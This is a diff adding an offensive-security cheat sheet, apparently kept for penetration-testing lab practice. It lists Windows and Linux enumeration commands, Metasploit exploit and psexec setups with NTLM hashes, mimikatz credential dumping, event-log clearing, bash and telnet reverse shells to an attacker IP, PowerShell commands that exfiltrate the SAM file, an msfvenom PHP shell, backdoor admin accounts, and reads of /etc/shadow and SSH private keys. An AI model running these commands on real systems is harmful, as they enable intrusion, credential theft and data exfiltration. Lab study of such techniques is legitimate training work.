@@ -1,0 +1,1420 @@
+##############################
+########   VBOX     ##########
+##############################
+apt-get update 
+apt-get install -y virtualbox-guest-x11
+reboot
+
+##############################
+######## VIM MAGIC ###########
+##############################
+#select all & copy
+:%y+
+:%!sed 's/<find>/<replace>/g'
+:%!cut -d ' ' -f1
+:%!<insert command here>
+
+##############################
+###### SCREENSHOT ############
+##############################
+gnome-screenshot -a -f screenshot.png
+eog screenshot.png
+
+##############################
+######## MSFCONSOLE ##########
+##############################
+systemctl start postgresql 
+#or
+/etc/init.d/postgresql start
+
+msfconsole
+
+msfdb init
+msfdb reinit
+
+db_status
+workspace
+workspace <change to this workspace>
+workspace -a <add workspace>
+workspace -d <delete workspace>
+workspace -h
+
+help
+
+creds
+
+db_export
+db_import
+
+creds
+hosts
+loot
+notes <ip>
+notes -a -t persistence -n 'run persistence' <ip> 
+notes -t persistence
+notes -S <search term/regex>
+notes -d <host>
+services <ip>
+services -p <port> -u
+vulns
+
+fg
+bg
+
+
+#import custom module
+mkdir -p $HOME/.msf4/modules/exploits/linux/http/
+cp /usr/share/exploitdb/exploits/linux/remote/10610.rb $HOME/.msf4/modules/exploits/linux/http/
+vi $HOME/.msf4/modules/exploits/linux/http/10610.rb
+#delete header until msf module is real
+reload_all
+
+
+##############################
+####### VBOX SHARED DRIVE ####
+##############################
+sudo mount -t vboxsf VMShared /root/Shared
+
+
+##############################
+##### UNICORN SCAN     #######
+##############################
+#tcp scan
+unicornscan <IP>
+#udp scan
+unicornscan -m U <IP>
+#specify ports
+unicornscan -m U -p1-65535 <IP>
+^this takes REALLLLY long
+##############################
+########## NMAP ##############
+##############################
+#tcpdump for SYNACK while scanning
+tcpdump -vnni tun0 'tcp[13] & 2 == 2' and 'tcp[10] & 16 == 16'
+
+
+db_nmap 10.11.1.49 -p1-65535
+
+ls -al /usr/share/nmap/scripts
+
+# Ping Scan
+nmap -sn 10.11.1.1-254 -oG lab-hosts.txt
+db_nmap -sn 10.11.1.1-254 -oG lab-hosts.txt
+
+# SYN Scan
+nmap -Pn -n -sS 10.11.1.1-254 --top-ports 20 -oG lab-syn-top20.txt
+db_nmap -Pn -n -sS 10.11.1.1-254 --top-ports 20 -oG lab-syn-top20.txt
+
+grep 445/open lab-syn-top20.txt | cut -d " " -f2 > lab-445-open.txt
+
+# Full Connect Scan 
+nmap -Pn -n -sT 10.11.1.1-254 --top-ports 20 -oG lab-syn-top20.txt
+db_nmap -Pn -n -sT 10.11.1.1-254 --top-ports 20 -oG lab-syn-top20.txt
+
+# SERVICE VERSION -- takes a long time
+nmap -sV -iL lab-445-open.txt --top-ports 20 -oG lab-windows-versions.txt
+db_nmap -sV -iL lab-445-open.txt --top-ports 20 -oG lab-windows-versions.txt
+
+# OS DISCOVERY - SMB NSE - fast
+nmap -Pn -n -p 139,445 --script smb-os-discovery.nse -iL lab-445-open.txt -oG lab-smb-os-disc.txt
+db_nmap -Pn -n -p 139,445 --script smb-os-discovery.nse -iL lab-445-open.txt -oG lab-smb-os-disc.txt
+
+grep Windows lab-smb-os-disc.txt | cut -d " " -f 2 > lab-windows-smb.txt
+
+# Vuln Testing - SMB NSE 
+nmap -Pn -n -p 139,445 --script smb-vuln-ms17-010.nse -iL lab-windows-smb.txt -oG lab-windows-smb-ms17010.txt
+db_nmap -Pn -n -p 139,445 --script smb-vuln-ms17-010.nse -iL lab-windows-smb.txt -oG lab-windows-smb-ms17010.txt
+
+notes -t nmap.nse.smb-vuln-ms17-010.host
+
+# Web Server Version 
+nmap -sV -Pn -n -p 80 --version-trace --version-intensity <0-9> 10.11.1.230
+db_nmap -sV -Pn -n -p 80 --version-trace --version-intensity <0-9> 10.11.1.230
+
+nmap -n -A -PN -p- -T Agressive -iL nmap.targetlist -oX nmap.syn.results.xml
+n
+map -sU -PN -v -O -p 1-30000 -T polite -iL nmap.targetlist > nmap.udp.results
+nmap -sU -Pn -T4 -A --top-ports 1000 10.11.1.226
+nmap -sU -Pn -sV --top-ports 1000 10.11.1.226
+
+
+
+nmap -sV -PN -v -p 21,22,23,25,53,80,443,161 -iL nmap.targets > nmap.version.results
+nmap -A -sS -PN -n --script:all ip_address --reason
+grep "appears to be up" nmap_saved_filename | awk -F\( '{print $2}' | awk -F\) '{print $1}' > ip_list
+
+# Scan for version, with NSE-scripts and trying to identify OS
+nmap 10.11.1.X -sV -sC -O
+
+#faster scanning
+masscan -e tun0 -p 1-65535 --rate=200 10.10.10.76
+masscan -e tun0 --ports U:1-65535 --rate=200 10.10.10.76
+#if you get errors related to router/interface, set router-ip to destination ip (when on same subnet), otherwise use gateway
+masscan -p 1-65535 --rate=200 10.50.60.210 -e tap0 --router-ip 10.50.60.210
+
+
+##############################
+##### NC              ########
+##############################
+nc -nvzw1 <ip> <port>
+
+
+
+##############################
+##### DEV TCP BASH    ########
+##############################
+/bin/bash 0>/dev/tcp/10.11.0.164/443 1>&0 2>&0
+
+##############################
+##### AMAP            ########
+##############################
+#application probing
+amap [Mode] [Options] <target> <port/portrange> [<port> ...]
+
+amap -bqv 192.168.1.1 80
+
+
+##############################
+##### XPROBE          ########
+##############################
+#os identification
+xprobe2 192.168.1.1 
+
+##############################
+# VFEED (VULNS, NOT SPLOITS) #
+##############################
+vfeedcli
+
+##############################
+##### SEARCH SPLOIT   ########
+##############################
+searchsploit -u
+searchsploit <name>
+searchsploit -t <title search only>
+searchsploit -t php 5.x | grep -v '/dos/'
+searchsploit --colour -t php 5.x | grep -v '/dos/' | grep -iv '\.php[^$]'
+##############################
+##### SMB ENUMERATION ########
+##############################
+nbtscan <subnet/24>
+nbtscan -r <subnet/24>
+
+enum4linux -a <ip>
+enum4linux -o <ip>
+
+python /opt/nullinux/nullinux.py -all <ip>
+
+use auxiliary/scanner/smb/smb_version
+set RHOSTS  <IP>
+run 
+
+smb-enum-users.nse
+nmap -Pn -n -p 139,445 --script smb-enum-users.nse -iL lab-windows-smb.txt -oG lab-smb-users-enum.txt
+db_nmap -Pn -n -p 139,445 --script smb-enum-users.nse -iL lab-windows-smb.txt -oG lab-smb-users-enum.txt
+
+notes -S "account"
+
+ls -l /usr/share/nmap/scripts/smb*
+
+nmblookup -A target
+smbclient //MOUNT/share -I target -N
+smbclient -L //10.11.1.31/
+smbclient //10.10.10.100/Users -t 3 -U SVC_TGS%GPPstillStandingStrong2k18 
+
+prompt off
+recurse on
+ls
+#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+#get smb version (if your smbclient -V is not 4.6.7)
+smbclient -V
+#so far these ports have worked, also this seems like it works best for linux
+wireshark
+port 139 or port 445
+#or use tcpdump
+tcpdump -vXi tap0 | grep -i -A2 -B2 Samba
+
+smbclient -U "" -L //10.11.1.115/
+^do not enter password, view tcp stream, should see SMB/SAMBA server version in tcp stream
+
+# SMB "DIALECTS"
+https://msdn.microsoft.com/en-us/library/ee441843.aspx
+#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+pth-smbclient -U "" -I <ip> //<ip>/<share>
+
+rpcclient -U "" target
+	srvinfo
+	netshareenum
+	getusername
+	enumprivs
+	enumdomusers
+	enumdomgroups
+	lookupnames <username>
+	lookupnames <groupname> 
+	queryuser
+	enumalsgroups domain
+	enumtrust
+	enumdomains
+
+#linux rpc
+rpcinfo -p 10.11.1.72
+
+showmount -e <remote_nfs_server>
+showmount --all <remote_nfs_server>
+
+mount <remote ip>:<remote folder> <local folder>
+mount 192.168.1.126:/exports /local/ubuntu
+
+nmap --script -sV rpc-grind 10.11.1.72
+#mehhh ^
+
+##############################
+######## LDAP ENUM ###########
+##############################
+nmap -p 389 --script ldap-rootdse 10.10.10.107
+
+ldapsearch -h 10.10.10.107 -p 389 -x -s base -b '' "(objectClass=*)" "*" +
+-h ldap server
+-p port of ldap
+-x simple authentication
+-b search base
+-s scope is defined as base
+
+ldapsearch -h 10.10.10.107 -p 389 -x -b "dc=example,dc=com"
+ldapsearch -h 10.10.10.107 -p 389 -x -b "dc=hackthebox,dc=htb"
+
+jxplorer
+
+
+##############################
+######## SMTP ENUM ###########
+##############################
+nc -nv <ip> 25
+# wait until you get a header
+
+#check for username
+VRFY <username>
+
+smtp-user-enum -M VRFY -U /usr/share/wordlists/dirb/common.txt -t 192.168.2.4
+tcpdump -Aqi tap0 tcp port 25 | grep VRFY
+
+##############################
+######## SNMP ENUM ###########
+##############################
+# nmap
+nmap -sU --open -p 161 10.11.1.1-254 -oG lab-snmp.txt
+db_nmap -sU --open -p 161 10.11.1.1-254 -oG lab-snmp.txt
+
+# onesixtyone
+echo public > comm-strs.txt
+echo private >> comm-strs.txt
+echo manager >> comm-strs.txt
+for ip in $(seq 1 254); do echo 10.11.1.$ip; done > ips.txt
+onesixtyone -c comm-strs.txt -i ips.txt
+
+# enumerate entire mib tree
+snmpwalk -c public -v1 <ip>
+snmpwalk -c public -v2c <ip>
+
+## WINDOWS MIBS ##
+# users
+snmpwalk -c public -v1 <ip> 1.3.6.1.4.1.77.1.2.25
+# processes
+snmpwalk -c public -v1 <ip> 1.3.6.1.2.1.25.4.2.1.2
+# open tcp ports
+snmpwalk -c public -v1 <ip> 1.3.6.1.2.1.6.13.1.3
+# Running Programs
+snmpwalk -c public -v1 <ip> 1.3.6.1.2.1.25.4.2.1.2
+# Processes Path
+snmpwalk -c public -v1 <ip> 1.3.6.1.2.1.25.4.2.1.4
+# Storage Units
+snmpwalk -c public -v1 <ip> 1.3.6.1.2.1.25.2.3.1.4
+# Software Name
+snmpwalk -c public -v1 <ip> 1.3.6.1.2.1.25.6.3.1.2
+
+use auxiliary/scanner/snmp/snmp_enumshares
+set RHOSTS 10.11.1.73
+exploit
+
+/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
+
+##############################
+#### FTP ANON ACCESS #########
+##############################
+nmap -Pn -n -v -p 21 --script=ftp-anon.nse 10.11.1.1-254
+db_nmap -Pn -n -v -p 21 --script=ftp-anon.nse 10.11.1.1-254 -oG lab-ftp-anon.txt
+
+anon
+anonymous
+ftpuser
+[blank pass]
+
+ftpuser
+ftpuser
+
+notes -S "Anonymous FTP login Allowed"
+
+
+##############################
+####  MS08_067 NET API #######
+##############################
+use exploit/windows/smb/ms08_067_netapi
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.11.0.164
+set LPORT 4444
+set RHOST 10.11.1.227
+
+##############################
+#### HYDRA     #########
+##############################
+hydra -L userlist.txt -P passlist.txt -M targets.txt ssh
+
+#http simple authentication brute force
+hydra -l Bethany -P mutated.txt -s 9505 -f 10.11.1.49 http-get /~login
+
+
+##############################
+#### SMB PS EXEC     #########
+##############################
+use auxiliary/scanner/smb/smb_login
+set RHOSTS 10.11.1.0/24
+set SMBUser Administrator
+set SMBPass 7bfd3ee62cbb0eba886450c5d6c50f12:f3acbe7ec27aadbe8deeaa0c651a64af
+set THREADS 50
+
+use exploit/windows/smb/psexec
+set payload windows/meterpreter/reverse_tcp
+set LPORT 4445
+set LHOST 10.11.0.164
+set RHOST 10.11.1.227
+set SMBUser Administrator
+set SMBPass 7bfd3ee62cbb0eba886450c5d6c50f12:f3acbe7ec27aadbe8deeaa0c651a64af
+set target 2 
+^ if no powershell
+
+##############################
+#### BYPASS UAC     #########
+##############################
+use exploit/windows/local/bypassuac
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.11.0.164
+set LPORT 443
+set SESSION 3
+run
+
+###################################
+#### HASHDUMP                 #####
+###################################
+*from meterpreter
+run post/windows/gather/smart_hashdump
+
+hashdump
+
+###################################
+#### MIMIKATZ                 #####
+###################################
+load mimikatz
+msv
+kerberos
+mimikatz_command -f samdump::hashes
+
+mimikatz_command -f handle::list
+mimikatz_command -f service::list
+mimikatz_command -f privilege::debug
+mimikatz_command -f sekurlsa::logonPasswords
+mimikatz_command -f samdump::hashes
+
+mimikatz_command -f crypto::listCertificates
+
+mimikatz_command -f event::clear
+
+
+
+# if UseLogonCredential set to 1, lsass will store clear-text passwords in mem
+reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
+
+###################################
+####   DNS ENUM               #####
+###################################
+host -t axfr <domain name> <dns server>
+host -a <domain name> <dns server>
+dig axfr @<dns server> <domain name>
+dig mx @<dns server> <domain name>
+dig a @<dns server> <domain name>
+###################################
+####    PROXYCHAINS           #####
+###################################
+vi /etc/proxychains.conf
+
+use auxiliary/server/socks4a
+
+route add 10.11.1.73 255.255.255.255 1
+
+###################################
+####    PORTFWD               #####
+###################################
+portfwd add -L 127.0.0.1 -l 3306 -r 127.0.0.1 -p 3306
+portfwd delete -L 127.0.0.1 -l 3306 -r 127.0.0.1 -p 3306
+portfwd
+
+###################################
+####  PTH-WINEXE             ######
+###################################
+pth-winexe -U kevin%aad3b435b51404eeaad3b435b51404ee:3164f206290117d74e9fa582139828d4 //10.11.1.230 cmd
+pth-winexe -U kevin%f8uHwN88Sx //10.11.1.230 cmd
+
+###################################
+####   POWERSHELL           #######
+###################################
+powershell $PSVersionTable.PSVersion
+powershell Get-FileHash <filepath> -Algorithm MD5
+powershell (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.164/FreeSSHD.exe', 'FreeSSHD.exe')
+
+#Data Exfil, Powershell >= 2
+powershell -noprofile -noninteractive -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $server="""http://<YOUR SPECIFIED IP>/<folder>""";$filepath="""C:\<file>\<to>\<exfil>"""; $http = new-object System.Net.WebClient; $response = $http.UploadFile($server,$filepath);"
+
+powershell -noprofile -noninteractive -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $server="""http://10.11.0.164/upload.php""";$filepath="""C:\sam"""; $http = new-object System.Net.WebClient; $response = $http.UploadFile($server,$filepath);"
+
+#for large files... watch them
+tcpdump -vnni tap0 tcp port 80
+
+
+###################################
+#### CURL                    ######
+###################################
+curl -F "file=@my_file.txt" http://server/upload.php
+curl -i 10.11.1.71
+curl -i -L 10.11.1.71
+curl 10.11.1.71 -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
+curl 10.11.1.71 -s -L | html2text -width '99' | uniq
+curl -i http://10.11.1.71/cgi-bin/admin.cgi -s | html2text
+
+#LFI search
+curl 'http://10.11.1.71/cgi-bin/admin.cgi' -i -s > before
+curl 'http://10.11.1.71/cgi-bin/admin.cgi?list=../../../../../../../../../../etc/passwd' -i -s > after
+diff --color before after
+
+#for large files... watch them
+tcpdump -vnni tap0 tcp port 80
+
+###################################
+#### SIMPLE PHP UPLOAD       ######
+###################################
+*see ~/PWK/homemade/upload.php
+cp ~/PWK/homemade/upload.php /var/www/html
+service apache2 start
+*use curl/powershell/etc to post file
+
+mkdir /var/www/html/uploads
+chgrp www-data /var/www/html/uploads
+chmod 775 /var/www/html/uploads
+
+#For large file uploads....
+locate php.ini
+/etc/php/7.0/apache2/php.ini
+/etc/php/7.0/cli/php.ini
+/etc/php/7.2/apache2/php.ini
+/etc/php/7.2/cli/php.ini
+#^change the below variables in all of these files
+post_max_size = 40M
+upload_max_filesize = 40M
+#restart your webserver
+service apache2 restart
+
+###################################
+#### PHP STUFF                #####
+###################################
+<?php phpinfo(); ?>
+
+#php shell
+msfvenom -p php/meterpreter_reverse_tcp LHOST=10.11.0.131 LPORT=443 EXITFUNC=thread -e php/base64 -f raw -o shell.php
+alias pbcopy='xclip -selection clipboard'
+alias pbpaste='xclip -selection clipboard -o'
+cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+
+
+###################################
+#### SAMDUMP2                ######
+###################################
+reg save hklm\sam c:\sam
+reg save hklm\system c:\system
+#exfil....
+samdump2 system sam
+
+###################################
+#### NET                     ######
+###################################
+net view /domain
+net view /domain:<domain to search>
+net user /domain
+net user <user> <pass> /add
+net localgroup "Administrators" <user> /add
+NET LOCALGROUP "Remote Desktop Users" hacked /ADD
+net accounts /domain
+net localgroup "Administrators"
+net group /domain
+net group "Domain Admins" /domain
+net group "Domain Controllers" /domain
+net share
+#active smb sessions
+net session | find / "\\"
+#unlock domain user account
+net user <user> /ACTIVE:yes /domain
+#change domain user password
+net user <user> "<newpass>" /domain
+#share a folder
+net share <share> c:\share /GRANT:Everyone,FULL
+net user <user> /delete
+#services that are started
+net start
+
+###################################
+#### Drivers                 ######
+###################################
+DRIVERQUERY 
+^look for 3rd party drivers, could be priv esc'able
+
+###################################
+#### SC                      ######
+###################################
+sc qc Spooler
+
+###################################
+#### QWINSTA                 ######
+###################################
+#check for logged in users
+qwinsta
+
+
+###################################
+#### NETSH                   ######
+###################################
+netsh advfirewall firewall show rule name=all status=enabled
+netsh firewall show state
+netsh firewall show config
+netsh advfirewall firewall show rule name=all
+netsh advfirewall export "firewall.txt"
+
+netsh dump
+
+netsh interface portproxy add v4tov4 listenport=8001 listenaddress=192.168.0.10 connectport=80 connectaddress=192.168.0.10
+netsh interface portproxy delete v4tov4 listenport=8001 listenaddress=192.168.0.10
+netsh interface portproxy show all
+###################################
+####  WINDOWS SNMP CONFIG    ######
+###################################
+reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
+
+###################################
+####  SCHTASKS               ######
+###################################
+schtasks /query /fo LIST /v
+schtasks /create /tn "My App" /tr c:\apps\myapp.exe /sc once /st 14:18 /sd 11/13/2002
+
+###################################
+####   WEVTUTIL / WECUTIL    ######
+###################################
+#Enum Logs
+wevtutil el
+#Enum Log Config
+wevtutil gl <log name>
+#Enum Publishers
+wevtutil ep
+#Get Publisher Config
+wevtutil gp <publisher name>
+#Clear Log
+wevtutil cl <log name>
+#Query Event in Log
+wevtutil qe <log name>
+#Count c, Reverse Direction (newest log first) rd
+wevtutil qe <log name> /c:1 /rd:true /f:Text
+#Query specific event id
+wevtutil qe <log name> /q:"*[System[(EventID=7045)]]" /c:5 /f:text /rd:true
+
+#enum Windows Event Forwarding Subscriptions
+wecutil es
+
+###################################
+####   WMIC                  ######
+###################################
+# Windows Management Instrumentation Command-line
+https://andreafortuna.org/dfir/windows-command-line-cheatsheet-part-2-wmic/
+# Alias list
+wmic alias list brief 
+# OS Arch
+wmic os get osarchitecture 
+wmic cpu get AddressWidth 
+# Processor Arch
+wmic cpu get DataWidth    
+# Last Boot Time
+wmic os get lastbootuptime
+# Local Time
+wmic os get LocalDateTime
+# Groups/Users Info
+wmic useraccount list
+wmic useraccount list brief
+wmic sysaccount list
+wmic sysaccount list brief
+wmic group list
+wmic group list brief
+wmic /user:Ã¢â‚¬FOREIGN_DOMAINAdminÃ¢â‚¬ /password:Ã¢â‚¬PasswordÃ¢â‚¬ /node:192.168.33.25 group list brief
+# Currently Logged in users
+wmic computersystem get username
+# Process List
+wmic process list
+wmic process list brief
+# Software versions
+wmic product get name,version
+# Start/Terminate an Application
+wmic process call create "calc.exe"
+wmic process where name="calc.exe" call terminate
+# Environment
+wmic environment list
+# Turn on Remoted Desktop
+Wmic /node:Ã¢â‚¬servernameÃ¢â‚¬ /user:Ã¢â‚¬user@domainÃ¢â‚¬ /password: Ã¢â‚¬Å“passwordÃ¢â‚¬ RDToggle where ServerName=Ã¢â‚¬server nameÃ¢â‚¬ call SetAllowTSConnections 1
+wmic RDToggle call SetAllowTSConnections 1
+^ need to figure these out a little more....
+# Startup List
+wmic startup list full
+wmic startup list brief
+# Patch Management
+wmic qfe list
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+# Shares
+wmic share list
+# NICS
+wmic nicconfig list
+wmic nicconfig list brief
+# Services 
+wmic service list
+wmic service list brief
+wmic service get caption, name, startmode, state
+wmic service where "state='running'" get caption, name, startmode, state
+# Event Logs
+wmic os get LocalDateTime
+wmic ntevent where TimeGenerated > 'YYYYMMDDHHmmSS.uuuuuu-ZZZ'
+wmic ntevent WHERE "TimeGenerated > '20180329122658.618000-420'" GET TimeGenerated
+wmic ntevent WHERE "LogFile='security' AND TimeGenerated > '20180329122658.618000-420'" GET TimeGenerated
+wmic ntevent where "message like '%logon%" GET TimeGenerated
+#Y 	Year
+#M 	Month
+#D 	Day
+#H 	Hour
+#m 	Minute
+#S 	Second
+#u 	Microsecond
+#- 	Literally, a -
+#Z 	Timezone offset in minutes from UTC (not hours)
+
+###################################
+#### WINDOWS ROUTES           #####
+###################################
+route print
+
+###################################
+#### WINDOWS ARP              #####
+###################################
+arp -a
+
+###################################
+#### WINDOWS HOST FILE        #####
+###################################
+type C:\WINDOWS\System32\drivers\etc\hosts
+
+###################################
+#### SEARCH WINDOWS FOR CREDS #####
+###################################
+dir C:\unattend.xml
+dir C:\sysprep.inf
+dir C:\sysprep\sysprep.inf
+
+dir c:\*vnc.ini /s /b /c
+dir c:\*ultravnc.ini /s /b /c
+dir c:\ /s /b /c | findstr /si *vnc.ini
+findstr /si password *.txt | *.xml | *.ini
+findstr /si pass *.txt | *.xml | *.ini
+dir /s *pass* == *cred* == *vnc* == *.config*
+findstr /si password *.xml *.ini *.txt
+
+reg query HKCU /f password /t REG_SZ /s
+reg query HKLM /f password /t REG_SZ /s 
+
+###################################
+#### WINDOWS ENUM SCRIPT     ######
+###################################
+https://github.com/pentestmonkey/windows-privesc-check
+
+git clone https://github.com/absolomb/WindowsEnum.git /opt/WindowsEnum
+cp /opt/WindowsEnum/WindowsEnum.ps1 .
+#upload
+#quick standard checks
+powershell -nologo -executionpolicy bypass -file WindowsEnum.ps1
+#extended checks 
+powershell -nologo -executionpolicy bypass -file WindowsEnum.ps1 extended
+
+###################################
+#### UNIX PRIV ESC SCRIPTS   ######
+###################################
+cp /opt/linuxprivcheck/linuxprivchecker.py /var/www/html
+wget http://10.11.0.164/linuxprivchecker.py
+chmod +x linuxprivchecker.py
+python linuxprivchecker.py
+
+cp /opt/LinEnum/LinEnum.sh /var/www/html
+wget http://10.11.0.164/LinEnum.sh
+chmod +x LinEnum.sh
+./LinEnum.sh
+
+cp /usr/share/unix-privesc-check/unix-privesc-check /var/www/html
+wget http://10.11.0.164/unix-privesc-check
+chmod +x unix-privesc-check
+./unix-privesc-check standard
+./unix-privesc-check detailed
+
+cp /opt/linux-exploit-suggester/linux-exploit-suggester.sh /var/www/html
+wget http://10.11.0.164/linux-exploit-suggester.sh 
+chmod +x linux-exploit-suggester.sh 
+./linux-exploit-suggester.sh 
+###################################
+#### SURVEY LINUX            ######
+###################################
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+#distro
+cat /etc/issue
+cat /etc/*-release
+cat /etc/lsb-release      # Debian based
+cat /etc/redhat-release   # Redhat based
+#kernel version
+cat /proc/version
+uname -a
+uname -mrs
+rpm -q kernel
+dmesg | grep Linux
+ls /boot | grep vmlinuz-
+#env vars
+cat /etc/profile
+cat /etc/bashrc
+cat ~/.bash_profile
+cat ~/.bashrc
+cat ~/.bash_logout
+env
+set
+#printers
+lpstat -a
+#apps & services
+ps -aux
+ps -ef
+top
+cat /etc/services
+#root services
+ps -aux | grep root
+ps -ef | grep root
+#apps installed, version, are they running?
+ls -alh /usr/bin
+ls -alh /sbin
+dpkg -l
+dpkg -l | grep -v lib
+rpm -qa
+ls -alh /var/cache/apt/archivesO
+ls -alh /var/cache/yum/
+#misconfigured services?
+service --status-all
+cat /etc/syslog.conf
+cat /etc/chttp.conf
+cat /etc/lighttpd.conf
+cat /etc/cups/cupsd.conf
+cat /etc/inetd.conf
+cat /etc/apache2/apache2.conf
+cat /etc/my.conf
+cat /etc/httpd/conf/httpd.conf
+cat /opt/lampp/etc/httpd.conf
+ls -aRl /etc/ | awk '$1 ~ /^.*r.*/'
+#scheduled jobs?
+crontab -l
+ls -alh /var/spool/cron
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny
+cat /etc/crontab
+cat /etc/anacrontab
+cat /var/spool/cron/crontabs/root
+#plaintext passwords/usernames
+grep -i password -R /etc 2>/dev/null
+grep -i user [filename]
+grep -i pass [filename]
+grep -C 5 "password" [filename]
+find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
+#nics
+/sbin/ifconfig -a
+cat /etc/network/interfaces
+cat /etc/sysconfig/network
+#net config, what is on the network? dhcp srv? dns srv? gateway?
+cat /etc/resolv.conf
+cat /etc/sysconfig/network
+cat /etc/networks
+iptables -L
+hostname
+dnsdomainname
+#what other users and hosts are communicating on the system?
+lsof -i
+lsof -i :80
+grep 80 /etc/services
+netstat -antup
+netstat -antpx
+netstat -tulpn
+chkconfig --list
+chkconfig --list | grep 3:on
+last
+w
+#what is cached? arp/mac
+arp -e
+route
+/sbin/route -nee
+#try to sniff traffic
+tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
+#cleartext creds sniff
+tcpdump port http or port ftp or port smtp or port imap or port pop3 -l -A | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-buffered -B20
+
+#shell? 
+nc -lvp 4444    # Attacker. Input (Commands)
+nc -lvp 4445    # Attacker. Ouput (Results)
+telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
+#port forwarding?
+FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
+ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
+ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
+mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe    # Port Relay
+mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
+mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
+ssh -D 127.0.0.1:9050 -N [username]@[ip]
+proxychains ifconfig
+#confidential info and users, who are you, who is logged in, who else is there, who can do what?
+id
+who
+w
+last
+cat /etc/passwd | cut -d: -f1    # List of users
+grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
+awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
+cat /etc/sudoers
+sudo -l
+#sensitive files?
+cat /etc/passwd
+cat /etc/group
+cat /etc/shadow
+ls -alh /var/mail/
+#home directories- interesting files?
+ls -ahlR /root/
+ls -ahlR /home/
+#histories- what has been going on? passwords?
+ls -al ~/
+cat ~/.bash_history
+cat ~/.nano_history
+cat ~/.atftp_history
+cat ~/.mysql_history
+cat ~/.php_history
+# user information
+cat ~/.bashrc
+cat ~/.profile
+cat /var/mail/root
+cat /var/spool/mail/root
+#private-key info?
+cat ~/.ssh/authorized_keys
+cat ~/.ssh/identity.pub
+cat ~/.ssh/identity
+cat ~/.ssh/id_rsa.pub
+cat ~/.ssh/id_rsa
+cat ~/.ssh/id_dsa.pub
+cat ~/.ssh/id_dsa
+cat /etc/ssh/ssh_config
+cat /etc/ssh/sshd_config
+cat /etc/ssh/ssh_host_dsa_key.pub
+cat /etc/ssh/ssh_host_dsa_key
+cat /etc/ssh/ssh_host_rsa_key.pub
+cat /etc/ssh/ssh_host_rsa_key
+cat /etc/ssh/ssh_host_key.pub
+cat /etc/ssh/ssh_host_key
+#which configs can be written to?
+ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
+ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
+ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
+ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other
+
+find /etc/ -readable -type f 2>/dev/null               # Anyone
+find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
+#what can be found in /var/?
+ls -alh /var/log
+ls -alh /var/mail
+ls -alh /var/spool
+ls -alh /var/spool/lpd
+ls -alh /var/lib/pgsql
+ls -alh /var/lib/mysql
+cat /var/lib/dhcp3/dhclient.leases
+#settings/files hidden on website? database infO?
+ls -alhR /var/www/
+ls -alhR /srv/www/htdocs/
+ls -alhR /usr/local/www/apache22/data/
+ls -alhR /opt/lampp/htdocs/
+ls -alhR /var/www/html/
+# log files? LFI <-
+cat /etc/httpd/logs/access_log
+cat /etc/httpd/logs/access.log
+cat /etc/httpd/logs/error_log
+cat /etc/httpd/logs/error.log
+cat /var/log/apache2/access_log
+cat /var/log/apache2/access.log
+cat /var/log/apache2/error_log
+cat /var/log/apache2/error.log
+cat /var/log/apache/access_log
+cat /var/log/apache/access.log
+cat /var/log/auth.log
+cat /var/log/chttp.log
+cat /var/log/cups/error_log
+cat /var/log/dpkg.log
+cat /var/log/faillog
+cat /var/log/httpd/access_log
+cat /var/log/httpd/access.log
+cat /var/log/httpd/error_log
+cat /var/log/httpd/error.log
+cat /var/log/lastlog
+cat /var/log/lighttpd/access.log
+cat /var/log/lighttpd/error.log
+cat /var/log/lighttpd/lighttpd.access.log
+cat /var/log/lighttpd/lighttpd.error.log
+cat /var/log/messages
+cat /var/log/secure
+cat /var/log/syslog
+cat /var/log/wtmp
+cat /var/log/xferlog
+cat /var/log/yum.log
+cat /var/run/utmp
+cat /var/webmin/miniserv.log
+cat /var/www/logs/access_log
+cat /var/www/logs/access.log
+ls -alh /var/lib/dhcp3/
+ls -alh /var/log/postgresql/
+ls -alh /var/log/proftpd/
+ls -alh /var/log/samba/
+#Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
+#If commands are limited, you break out of the "jail" shell?
+python -c 'import pty;pty.spawn("/bin/bash")'
+echo os.system('/bin/bash')
+/bin/sh -i
+#filesystems mounted
